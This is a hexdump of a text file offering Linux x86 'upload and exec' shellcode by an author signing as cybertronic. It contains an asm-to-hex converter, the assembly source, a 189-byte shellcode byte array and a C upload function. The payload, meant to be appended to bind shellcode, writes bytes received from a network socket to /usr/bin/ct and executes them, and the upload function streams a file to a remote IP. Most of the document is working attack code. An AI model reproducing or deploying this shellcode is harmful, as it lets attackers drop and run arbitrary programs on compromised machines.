00000000  55 50 4c 4f 41 44 20 26  20 45 58 45 43 20 53 48  |UPLOAD & EXEC SH|
00000010  45 4c 4c 43 4f 44 45 0d  0a 0d 0a 5b 31 5d 20 63  |ELLCODE....[1] c|
00000020  6f 6e 76 65 72 74 69 6e  67 20 61 73 6d 20 74 6f  |onverting asm to|
00000030  20 68 65 78 0d 0a 5b 32  5d 20 61 73 6d 20 63 6f  | hex..[2] asm co|
00000040  64 65 0d 0a 5b 33 5d 20  68 65 78 20 6f 75 74 70  |de..[3] hex outp|
00000050  75 74 0d 0a 5b 34 5d 20  75 70 6c 6f 61 64 20 66  |ut..[4] upload f|
00000060  75 6e 63 74 69 6f 6e 0d  0a 0d 0a 54 68 69 73 20  |unction....This |
00000070  69 73 20 61 6e 20 27 75  70 6c 6f 61 64 20 61 6e  |is an 'upload an|
00000080  64 20 65 78 65 63 27 20  73 68 65 6c 6c 63 6f 64  |d exec' shellcod|
00000090  65 20 66 6f 72 20 74 68  65 20 78 38 36 20 70 6c  |e for the x86 pl|
000000a0  61 74 66 6f 72 6d 2e 0d  0a 46 69 6c 65 20 68 61  |atform...File ha|
000000b0  73 20 74 6f 20 62 65 20  69 6e 20 65 78 65 63 75  |s to be in execu|
000000c0  74 61 62 6c 65 20 66 6f  72 6d 61 74 2c 0d 0a 63  |table format,..c|
000000d0  6f 6f 6c 20 69 66 20 79  6f 75 20 6b 6e 6f 77 20  |ool if you know |
000000e0  74 68 65 20 64 69 73 74  72 69 62 75 74 69 6f 6e  |the distribution|
000000f0  20 6f 66 20 74 68 65 20  74 61 72 67 65 74 2c 20  | of the target, |
00000100  6f 74 68 65 72 77 69 73  65 0d 0a 69 74 20 69 73  |otherwise..it is|
00000110  20 75 73 65 6c 65 73 73  2e 0d 0a 0d 0a 2d 63 79  | useless.....-cy|
00000120  62 65 72 74 72 6f 6e 69  63 0d 0a 0d 0a 5b 31 5d  |bertronic....[1]|
00000130  0d 0a 0d 0a 2f 2a 0d 0a  20 2a 20 63 6f 6e 76 65  |..../*.. * conve|
00000140  72 74 20 2e 73 20 74 6f  20 73 68 65 6c 6c 63 6f  |rt .s to shellco|
00000150  64 65 20 74 79 70 6f 2f  74 65 73 6f 20 28 74 79  |de typo/teso (ty|
00000160  70 6f 40 69 6e 66 65 72  6e 6f 2e 74 75 73 63 75  |po@inferno.tuscu|
00000170  6c 75 6d 2e 65 64 75 29  0d 0a 20 2a 0d 0a 20 2a  |lum.edu).. *.. *|
00000180  20 24 20 63 61 74 20 61  73 6d 2e 73 0d 0a 20 2a  | $ cat asm.s.. *|
00000190  20 2e 67 6c 6f 62 6c 20  63 62 65 67 69 6e 0d 0a  | .globl cbegin..|
000001a0  20 2a 20 2e 67 6c 6f 62  6c 20 63 65 6e 64 0d 0a  | * .globl cend..|
000001b0  20 2a 20 63 62 65 67 69  6e 3a 0d 0a 20 2a 20 22  | * cbegin:.. * "|
000001c0  61 73 6d 20 67 6f 65 73  20 68 65 72 65 22 0d 0a  |asm goes here"..|
000001d0  20 2a 20 63 65 6e 64 3a  0d 0a 20 2a 20 24 20 67  | * cend:.. * $ g|
000001e0  63 63 20 2d 57 61 6c 6c  20 61 73 6d 2e 73 20 61  |cc -Wall asm.s a|
000001f0  73 6d 32 68 65 78 2e 63  20 2d 6f 20 6f 75 74 0d  |sm2hex.c -o out.|
00000200  0a 20 2a 20 24 20 2e 2f  6f 75 74 0d 0a 20 2a 0d  |. * $ ./out.. *.|
00000210  0a 20 2a 2f 0d 0a 0d 0a  23 69 6e 63 6c 75 64 65  |. */....#include|
00000220  0d 0a 0d 0a 65 78 74 65  72 6e 20 76 6f 69 64 20  |....extern void |
00000230  63 62 65 67 69 6e 28 29  3b 0d 0a 65 78 74 65 72  |cbegin();..exter|
00000240  6e 20 76 6f 69 64 20 63  65 6e 64 28 29 3b 0d 0a  |n void cend();..|
00000250  0d 0a 69 6e 74 0d 0a 6d  61 69 6e 20 28 29 0d 0a  |..int..main ()..|
00000260  7b 0d 0a 20 20 20 20 69  6e 74 20 69 20 3d 20 30  |{..    int i = 0|
00000270  3b 0d 0a 20 20 20 20 69  6e 74 20 78 20 3d 20 30  |;..    int x = 0|
00000280  3b 0d 0a 20 20 20 20 63  68 61 72 2a 20 62 75 66  |;..    char* buf|
00000290  20 3d 20 28 20 63 68 61  72 2a 20 29 20 63 62 65  | = ( char* ) cbe|
000002a0  67 69 6e 3b 0d 0a 0d 0a  20 20 20 20 70 72 69 6e  |gin;....    prin|
000002b0  74 66 20 28 20 22 75 6e  73 69 67 6e 65 64 20 63  |tf ( "unsigned c|
000002c0  68 61 72 20 73 68 65 6c  6c 63 6f 64 65 5b 5d 20  |har shellcode[] |
000002d0  3d 5c 6e 5c 22 22 20 29  3b 0d 0a 20 20 20 20 66  |=\n\"" );..    f|
000002e0  6f 72 20 28 20 3b 20 28  20 2a 62 75 66 20 29 20  |or ( ; ( *buf ) |
000002f0  26 26 20 28 20 62 75 66  20 3c 20 28 20 63 68 61  |&& ( buf < ( cha|
00000300  72 2a 20 29 20 63 65 6e  64 20 29 3b 20 62 75 66  |r* ) cend ); buf|
00000310  2b 2b 20 29 0d 0a 09 7b  0d 0a 09 09 69 66 20 28  |++ )...{....if (|
00000320  20 69 2b 2b 20 3d 3d 20  31 36 20 29 0d 0a 09 09  | i++ == 16 )....|
00000330  09 69 20 3d 20 31 3b 0d  0a 09 09 69 66 20 28 20  |.i = 1;....if ( |
00000340  69 20 3d 3d 20 31 20 26  26 20 78 20 21 3d 20 30  |i == 1 && x != 0|
00000350  20 29 0d 0a 09 09 09 70  72 69 6e 74 66 20 28 20  | ).....printf ( |
00000360  22 5c 22 5c 6e 5c 22 22  20 29 3b 0d 0a 09 09 78  |"\"\n\"" );....x|
00000370  20 3d 20 31 3b 0d 0a 09  09 70 72 69 6e 74 66 20  | = 1;....printf |
00000380  28 20 22 5c 5c 78 25 30  32 78 22 2c 20 28 20 75  |( "\\x%02x", ( u|
00000390  6e 73 69 67 6e 65 64 20  63 68 61 72 20 29 2a 20  |nsigned char )* |
000003a0  62 75 66 20 29 3b 0d 0a  09 7d 0d 0a 09 70 72 69  |buf );...}...pri|
000003b0  6e 74 66 20 28 20 22 5c  22 3b 5c 6e 22 20 29 3b  |ntf ( "\";\n" );|
000003c0  0d 0a 20 20 20 20 72 65  74 75 72 6e 20 28 20 30  |..    return ( 0|
000003d0  20 29 3b 0d 0a 7d 0d 0a  0d 0a 5b 32 5d 0d 0a 0d  | );..}....[2]...|
000003e0  0a 23 20 61 70 70 65 6e  64 20 74 6f 20 61 6e 79  |.# append to any|
000003f0  20 62 69 6e 64 20 73 68  65 6c 6c 63 6f 64 65 0d  | bind shellcode.|
00000400  0a 23 20 67 63 63 20 2d  57 61 6c 6c 20 75 70 6c  |.# gcc -Wall upl|
00000410  6f 61 64 2d 65 78 65 63  2e 73 20 61 73 6d 32 68  |oad-exec.s asm2h|
00000420  65 78 2e 63 20 2d 6f 20  75 70 6c 6f 61 64 2d 65  |ex.c -o upload-e|
00000430  78 65 63 0d 0a 23 20 63  79 62 65 72 74 72 6f 6e  |xec..# cybertron|
00000440  69 63 0d 0a 0d 0a 2e 67  6c 6f 62 6c 20 63 62 65  |ic.....globl cbe|
00000450  67 69 6e 0d 0a 2e 67 6c  6f 62 6c 20 63 65 6e 64  |gin...globl cend|
00000460  0d 0a 0d 0a 63 62 65 67  69 6e 3a 0d 0a 0d 0a 09  |....cbegin:.....|
00000470  6d 6f 76 6c 20 25 65 61  78 2c 25 65 63 78 0d 0a  |movl %eax,%ecx..|
00000480  0d 0a 09 6a 6d 70 20 67  65 74 73 74 72 0d 0a 0d  |...jmp getstr...|
00000490  0a 73 74 61 72 74 3a 0d  0a 0d 0a 09 70 6f 70 6c  |.start:.....popl|
000004a0  20 25 65 73 69 0d 0a 0d  0a 09 6c 65 61 6c 20 28  | %esi.....leal (|
000004b0  25 65 73 69 29 2c 25 65  62 78 0d 0a 09 78 6f 72  |%esi),%ebx...xor|
000004c0  6c 20 25 65 61 78 2c 25  65 61 78 0d 0a 09 6d 6f  |l %eax,%eax...mo|
000004d0  76 62 20 25 61 6c 2c 30  78 30 62 28 25 65 73 69  |vb %al,0x0b(%esi|
000004e0  29 0d 0a 0d 0a 09 70 75  73 68 6c 20 25 65 73 69  |).....pushl %esi|
000004f0  0d 0a 09 70 75 73 68 6c  20 25 65 63 78 0d 0a 0d  |...pushl %ecx...|
00000500  0a 09 6d 6f 76 62 20 24  30 78 30 35 2c 25 61 6c  |..movb $0x05,%al|
00000510  0d 0a 09 6d 6f 76 77 20  24 30 78 32 34 31 2c 25  |...movw $0x241,%|
00000520  63 78 0d 0a 09 6d 6f 76  77 20 24 30 30 37 37 37  |cx...movw $00777|
00000530  2c 25 64 78 0d 0a 09 69  6e 74 20 20 24 30 78 38  |,%dx...int  $0x8|
00000540  30 0d 0a 09 6d 6f 76 6c  20 25 65 61 78 2c 25 65  |0...movl %eax,%e|
00000550  64 69 0d 0a 09 70 6f 70  6c 20 25 65 73 69 0d 0a  |di...popl %esi..|
00000560  0d 0a 72 65 61 64 3a 0d  0a 0d 0a 09 6d 6f 76 6c  |..read:.....movl|
00000570  20 25 65 73 69 2c 25 65  62 78 0d 0a 09 6d 6f 76  | %esi,%ebx...mov|
00000580  62 20 24 30 78 30 33 2c  25 61 6c 0d 0a 09 6c 65  |b $0x03,%al...le|
00000590  61 6c 20 2d 32 30 30 28  25 65 73 70 29 2c 25 65  |al -200(%esp),%e|
000005a0  63 78 0d 0a 09 6d 6f 76  62 20 24 30 78 30 31 2c  |cx...movb $0x01,|
000005b0  25 64 6c 0d 0a 09 69 6e  74 20 20 24 30 78 38 30  |%dl...int  $0x80|
000005c0  0d 0a 0d 0a 09 63 6d 70  6c 20 24 30 78 66 66 66  |.....cmpl $0xfff|
000005d0  66 66 66 66 66 2c 25 65  61 78 0d 0a 09 6a 65 20  |fffff,%eax...je |
000005e0  65 6e 64 0d 0a 09 78 6f  72 6c 20 25 65 63 78 2c  |end...xorl %ecx,|
000005f0  25 65 63 78 0d 0a 09 63  6d 70 6c 20 25 65 61 78  |%ecx...cmpl %eax|
00000600  2c 25 65 63 78 0d 0a 09  6a 65 20 63 6f 6e 74 69  |,%ecx...je conti|
00000610  6e 75 65 0d 0a 0d 0a 09  6c 65 61 6c 20 2d 32 30  |nue.....leal -20|
00000620  30 28 25 65 73 70 29 2c  25 65 63 78 0d 0a 09 78  |0(%esp),%ecx...x|
00000630  6f 72 6c 20 25 65 62 78  2c 25 65 62 78 0d 0a 09  |orl %ebx,%ebx...|
00000640  6d 6f 76 6c 20 25 65 64  69 2c 25 65 62 78 0d 0a  |movl %edi,%ebx..|
00000650  09 6d 6f 76 6c 20 25 65  61 78 2c 25 65 64 78 0d  |.movl %eax,%edx.|
00000660  0a 09 6d 6f 76 62 20 24  30 78 30 34 2c 25 61 6c  |..movb $0x04,%al|
00000670  0d 0a 09 69 6e 74 20 20  24 30 78 38 30 0d 0a 0d  |...int  $0x80...|
00000680  0a 09 6a 6d 70 20 72 65  61 64 0d 0a 0d 0a 63 6f  |..jmp read....co|
00000690  6e 74 69 6e 75 65 3a 0d  0a 0d 0a 09 6d 6f 76 62  |ntinue:.....movb|
000006a0  20 24 30 78 30 36 2c 25  61 6c 0d 0a 09 6d 6f 76  | $0x06,%al...mov|
000006b0  6c 20 25 65 73 69 2c 25  65 62 78 0d 0a 09 69 6e  |l %esi,%ebx...in|
000006c0  74 20 20 24 30 78 38 30  0d 0a 09 6d 6f 76 62 20  |t  $0x80...movb |
000006d0  24 30 78 30 36 2c 25 61  6c 0d 0a 09 78 6f 72 6c  |$0x06,%al...xorl|
000006e0  20 25 65 62 78 2c 25 65  62 78 0d 0a 09 6d 6f 76  | %ebx,%ebx...mov|
000006f0  6c 20 25 65 64 69 2c 25  65 62 78 0d 0a 09 69 6e  |l %edi,%ebx...in|
00000700  74 20 20 24 30 78 38 30  0d 0a 0d 0a 09 78 6f 72  |t  $0x80.....xor|
00000710  6c 20 25 65 73 69 2c 20  25 65 73 69 0d 0a 09 70  |l %esi, %esi...p|
00000720  6f 70 6c 20 25 65 73 69  0d 0a 09 6d 6f 76 6c 20  |opl %esi...movl |
00000730  25 65 73 69 2c 30 78 30  63 28 25 65 73 69 29 0d  |%esi,0x0c(%esi).|
00000740  0a 09 78 6f 72 6c 20 25  65 61 78 2c 25 65 61 78  |..xorl %eax,%eax|
00000750  0d 0a 09 6d 6f 76 6c 20  25 65 61 78 2c 30 78 31  |...movl %eax,0x1|
00000760  30 28 25 65 73 69 29 0d  0a 09 6d 6f 76 62 20 24  |0(%esi)...movb $|
00000770  30 78 30 62 2c 25 61 6c  0d 0a 09 78 63 68 67 6c  |0x0b,%al...xchgl|
00000780  20 25 65 73 69 2c 25 65  62 78 0d 0a 09 6c 65 61  | %esi,%ebx...lea|
00000790  6c 20 30 78 30 63 28 25  65 62 78 29 2c 25 65 63  |l 0x0c(%ebx),%ec|
000007a0  78 0d 0a 09 6c 65 61 6c  20 30 78 31 30 28 25 65  |x...leal 0x10(%e|
000007b0  62 78 29 2c 25 65 64 78  0d 0a 09 69 6e 74 20 24  |bx),%edx...int $|
000007c0  30 78 38 30 0d 0a 0d 0a  65 6e 64 3a 0d 0a 0d 0a  |0x80....end:....|
000007d0  09 78 6f 72 6c 20 25 65  61 78 2c 25 65 61 78 0d  |.xorl %eax,%eax.|
000007e0  0a 09 69 6e 63 6c 20 25  65 61 78 0d 0a 09 69 6e  |..incl %eax...in|
000007f0  74 20 24 30 78 38 30 0d  0a 0d 0a 67 65 74 73 74  |t $0x80....getst|
00000800  72 3a 0d 0a 0d 0a 09 63  61 6c 6c 20 73 74 61 72  |r:.....call star|
00000810  74 0d 0a 09 2e 73 74 72  69 6e 67 20 22 2f 75 73  |t....string "/us|
00000820  72 2f 62 69 6e 2f 63 74  22 0d 0a 0d 0a 63 65 6e  |r/bin/ct"....cen|
00000830  64 3a 0d 0a 0d 0a 5b 33  5d 0d 0a 0d 0a 2f 2a 0d  |d:....[3]..../*.|
00000840  0a 20 2a 20 6c 69 6e 75  78 20 78 38 36 0d 0a 20  |. * linux x86.. |
00000850  2a 20 31 38 39 20 62 79  74 65 73 20 75 70 6c 6f  |* 189 bytes uplo|
00000860  61 64 20 26 20 65 78 65  63 20 73 68 65 6c 6c 63  |ad & exec shellc|
00000870  6f 64 65 20 62 79 20 63  79 62 65 72 74 72 6f 6e  |ode by cybertron|
00000880  69 63 0d 0a 20 2a 20 63  79 62 65 72 74 72 6f 6e  |ic.. * cybertron|
00000890  69 63 5b 61 74 5d 67 6d  78 5b 64 6f 74 5d 6e 65  |ic[at]gmx[dot]ne|
000008a0  74 0d 0a 20 2a 0d 0a 20  2a 2f 0d 0a 0d 0a 75 6e  |t.. *.. */....un|
000008b0  73 69 67 6e 65 64 20 63  68 61 72 20 73 68 65 6c  |signed char shel|
000008c0  6c 63 6f 64 65 5b 5d 20  3d 0d 0a 22 5c 78 33 31  |lcode[] =.."\x31|
000008d0  5c 78 64 62 5c 78 66 37  5c 78 65 33 5c 78 62 30  |\xdb\xf7\xe3\xb0|
000008e0  5c 78 36 36 5c 78 35 33  5c 78 34 33 5c 78 35 33  |\x66\x53\x43\x53|
000008f0  5c 78 34 33 5c 78 35 33  5c 78 38 39 5c 78 65 31  |\x43\x53\x89\xe1|
00000900  5c 78 34 62 5c 78 63 64  5c 78 38 30 22 0d 0a 22  |\x4b\xcd\x80".."|
00000910  5c 78 38 39 5c 78 63 37  5c 78 35 32 5c 78 36 36  |\x89\xc7\x52\x66|
00000920  5c 78 36 38 5c 78 63 37  5c 78 63 37 5c 78 34 33  |\x68\xc7\xc7\x43|
00000930  5c 78 36 36 5c 78 35 33  5c 78 38 39 5c 78 65 31  |\x66\x53\x89\xe1|
00000940  5c 78 62 30 5c 78 65 66  5c 78 66 36 5c 78 64 30  |\xb0\xef\xf6\xd0|
00000950  22 0d 0a 22 5c 78 35 30  5c 78 35 31 5c 78 35 37  |".."\x50\x51\x57|
00000960  5c 78 38 39 5c 78 65 31  5c 78 62 30 5c 78 36 36  |\x89\xe1\xb0\x66|
00000970  5c 78 63 64 5c 78 38 30  5c 78 62 30 5c 78 36 36  |\xcd\x80\xb0\x66|
00000980  5c 78 34 33 5c 78 34 33  5c 78 63 64 5c 78 38 30  |\x43\x43\xcd\x80|
00000990  5c 78 35 30 22 0d 0a 22  5c 78 35 30 5c 78 35 37  |\x50".."\x50\x57|
000009a0  5c 78 38 39 5c 78 65 31  5c 78 34 33 5c 78 62 30  |\x89\xe1\x43\xb0|
000009b0  5c 78 36 36 5c 78 63 64  5c 78 38 30 5c 78 38 39  |\x66\xcd\x80\x89|
000009c0  5c 78 63 31 5c 78 65 62  5c 78 37 30 5c 78 35 65  |\xc1\xeb\x70\x5e|
000009d0  5c 78 38 64 5c 78 31 65  22 0d 0a 22 5c 78 33 31  |\x8d\x1e".."\x31|
000009e0  5c 78 63 30 5c 78 38 38  5c 78 34 36 5c 78 30 62  |\xc0\x88\x46\x0b|
000009f0  5c 78 35 36 5c 78 35 31  5c 78 62 30 5c 78 30 35  |\x56\x51\xb0\x05|
00000a00  5c 78 36 36 5c 78 62 39  5c 78 34 31 5c 78 30 32  |\x66\xb9\x41\x02|
00000a10  5c 78 36 36 5c 78 62 61  5c 78 66 66 22 0d 0a 22  |\x66\xba\xff".."|
00000a20  5c 78 30 31 5c 78 63 64  5c 78 38 30 5c 78 38 39  |\x01\xcd\x80\x89|
00000a30  5c 78 63 37 5c 78 35 65  5c 78 38 39 5c 78 66 33  |\xc7\x5e\x89\xf3|
00000a40  5c 78 62 30 5c 78 30 33  5c 78 38 64 5c 78 38 63  |\xb0\x03\x8d\x8c|
00000a50  5c 78 32 34 5c 78 33 38  5c 78 66 66 5c 78 66 66  |\x24\x38\xff\xff|
00000a60  22 0d 0a 22 5c 78 66 66  5c 78 62 32 5c 78 30 31  |".."\xff\xb2\x01|
00000a70  5c 78 63 64 5c 78 38 30  5c 78 38 33 5c 78 66 38  |\xcd\x80\x83\xf8|
00000a80  5c 78 66 66 5c 78 37 34  5c 78 33 65 5c 78 33 31  |\xff\x74\x3e\x31|
00000a90  5c 78 63 39 5c 78 33 39  5c 78 63 31 5c 78 37 34  |\xc9\x39\xc1\x74|
00000aa0  5c 78 31 33 22 0d 0a 22  5c 78 38 64 5c 78 38 63  |\x13".."\x8d\x8c|
00000ab0  5c 78 32 34 5c 78 33 38  5c 78 66 66 5c 78 66 66  |\x24\x38\xff\xff|
00000ac0  5c 78 66 66 5c 78 33 31  5c 78 64 62 5c 78 38 39  |\xff\x31\xdb\x89|
00000ad0  5c 78 66 62 5c 78 38 39  5c 78 63 32 5c 78 62 30  |\xfb\x89\xc2\xb0|
00000ae0  5c 78 30 34 5c 78 63 64  22 0d 0a 22 5c 78 38 30  |\x04\xcd".."\x80|
00000af0  5c 78 65 62 5c 78 64 33  5c 78 62 30 5c 78 30 36  |\xeb\xd3\xb0\x06|
00000b00  5c 78 38 39 5c 78 66 33  5c 78 63 64 5c 78 38 30  |\x89\xf3\xcd\x80|
00000b10  5c 78 62 30 5c 78 30 36  5c 78 33 31 5c 78 64 62  |\xb0\x06\x31\xdb|
00000b20  5c 78 38 39 5c 78 66 62  5c 78 63 64 22 0d 0a 22  |\x89\xfb\xcd".."|
00000b30  5c 78 38 30 5c 78 33 31  5c 78 66 36 5c 78 35 65  |\x80\x31\xf6\x5e|
00000b40  5c 78 38 39 5c 78 37 36  5c 78 30 63 5c 78 33 31  |\x89\x76\x0c\x31|
00000b50  5c 78 63 30 5c 78 38 39  5c 78 34 36 5c 78 31 30  |\xc0\x89\x46\x10|
00000b60  5c 78 62 30 5c 78 30 62  5c 78 38 37 5c 78 66 33  |\xb0\x0b\x87\xf3|
00000b70  22 0d 0a 22 5c 78 38 64  5c 78 34 62 5c 78 30 63  |".."\x8d\x4b\x0c|
00000b80  5c 78 38 64 5c 78 35 33  5c 78 31 30 5c 78 63 64  |\x8d\x53\x10\xcd|
00000b90  5c 78 38 30 5c 78 33 31  5c 78 63 30 5c 78 34 30  |\x80\x31\xc0\x40|
00000ba0  5c 78 63 64 5c 78 38 30  5c 78 65 38 5c 78 38 62  |\xcd\x80\xe8\x8b|
00000bb0  5c 78 66 66 22 0d 0a 22  5c 78 66 66 5c 78 66 66  |\xff".."\xff\xff|
00000bc0  5c 78 32 66 5c 78 37 35  5c 78 37 33 5c 78 37 32  |\x2f\x75\x73\x72|
00000bd0  5c 78 32 66 5c 78 36 32  5c 78 36 39 5c 78 36 65  |\x2f\x62\x69\x6e|
00000be0  5c 78 32 66 5c 78 36 33  5c 78 37 34 22 3b 0d 0a  |\x2f\x63\x74";..|
00000bf0  0d 0a 5b 34 5d 0d 0a 0d  0a 69 6e 74 0d 0a 75 70  |..[4]....int..up|
00000c00  6c 6f 61 64 20 28 20 63  68 61 72 2a 20 69 70 20  |load ( char* ip |
00000c10  29 0d 0a 7b 0d 0a 09 69  6e 74 20 73 3b 0d 0a 09  |)..{...int s;...|
00000c20  69 6e 74 20 66 64 3b 0d  0a 09 63 68 61 72 20 63  |int fd;...char c|
00000c30  68 3b 0d 0a 09 73 74 72  75 63 74 20 73 74 61 74  |h;...struct stat|
00000c40  20 73 74 3b 0d 0a 0d 0a  09 73 20 3d 20 63 6f 6e  | st;.....s = con|
00000c50  6e 20 28 20 69 70 20 29  3b 0d 0a 0d 0a 09 69 66  |n ( ip );.....if|
00000c60  20 28 20 28 20 66 64 20  3d 20 6f 70 65 6e 20 28  | ( ( fd = open (|
00000c70  20 22 66 69 6c 65 22 2c  20 4f 5f 52 44 4f 4e 4c  | "file", O_RDONL|
00000c80  59 20 29 20 29 20 3d 3d  20 2d 31 20 29 0d 0a 09  |Y ) ) == -1 )...|
00000c90  09 72 65 74 75 72 6e 20  28 20 31 20 29 3b 0d 0a  |.return ( 1 );..|
00000ca0  09 66 73 74 61 74 20 28  20 66 64 2c 20 26 73 74  |.fstat ( fd, &st|
00000cb0  20 29 3b 0d 0a 09 77 68  69 6c 65 20 28 20 73 74  | );...while ( st|
00000cc0  2e 73 74 5f 73 69 7a 65  2d 2d 20 3e 20 30 20 29  |.st_size-- > 0 )|
00000cd0  0d 0a 09 7b 0d 0a 09 09  69 66 20 28 20 72 65 61  |...{....if ( rea|
00000ce0  64 20 28 20 66 64 2c 20  26 63 68 2c 20 31 20 29  |d ( fd, &ch, 1 )|
00000cf0  20 3c 20 30 20 29 0d 0a  09 09 09 72 65 74 75 72  | < 0 ).....retur|
00000d00  6e 20 28 20 31 20 29 3b  0d 0a 09 09 69 66 20 28  |n ( 1 );....if (|
00000d10  20 77 72 69 74 65 20 28  20 73 2c 20 26 63 68 2c  | write ( s, &ch,|
00000d20  20 31 20 29 20 3c 20 30  20 29 0d 0a 09 09 09 72  | 1 ) < 0 ).....r|
00000d30  65 74 75 72 6e 20 28 20  31 20 29 3b 0d 0a 09 7d  |eturn ( 1 );...}|
00000d40  0d 0a 09 63 6c 6f 73 65  20 28 20 66 64 20 29 3b  |...close ( fd );|
00000d50  0d 0a 09 63 6c 6f 73 65  20 28 20 73 20 29 3b 0d  |...close ( s );.|
00000d60  0a 09 72 65 74 75 72 6e  20 28 20 30 20 29 3b 0d  |..return ( 0 );.|
00000d70  0a 7d                                             |.}|
00000d72
